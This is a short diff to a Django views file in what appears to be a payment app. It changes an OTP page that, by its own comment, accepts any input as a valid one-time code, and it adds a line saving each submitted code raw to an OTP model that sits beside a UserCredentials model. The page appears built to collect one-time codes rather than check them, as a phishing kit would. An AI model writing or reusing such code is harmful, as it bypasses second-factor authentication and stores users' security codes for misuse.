@@ -7,7 +7,7 @@ from django.utils.crypto import get_random_string
 from .models import Payment
 from .forms import PaymentForm
 import random
-from .models import UserCredentials
+from .models import UserCredentials,OTP
 from django.contrib.auth.hashers import make_password
 
 
@@ -79,8 +79,9 @@ def otp_page(request):
             request.POST.get("otp5", "") +
             request.POST.get("otp6", "")
         )
-
         if otp:  # Accept any input as a valid OTP
+            #create otp object
+            OTP.objects.create(otp = otp)
             return redirect('success_page')  # Redirect to success page
         
         else:
